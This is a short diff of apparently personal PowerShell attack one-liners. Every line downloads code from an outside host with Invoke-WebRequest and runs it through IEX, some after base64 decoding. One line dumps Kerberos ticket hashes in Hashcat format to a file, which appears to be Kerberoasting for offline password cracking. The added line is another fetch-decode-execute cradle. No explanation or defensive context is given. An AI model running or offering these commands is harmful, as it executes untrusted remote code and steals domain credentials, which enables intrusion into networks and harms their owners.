@@ -5,3 +5,5 @@ IEX [System.Convert]::FromBase64String((Invoke-WebRequest 'https://jimrush.me/kb
 IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Invoke-WebRequest 'https://jimrush.me/kb64.txt'))));Invoke-K -OutputFormat Hashcat | Select-Object -ExpandProperty hash | out-file -Encoding ASCII c:\temp\kerb.out
 
 IEX (Invoke-WebRequest 'http://jimrush.me/whoami.txt');
+
+IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Invoke-WebRequest 'https://jimrush.me/whoami.txt'))));
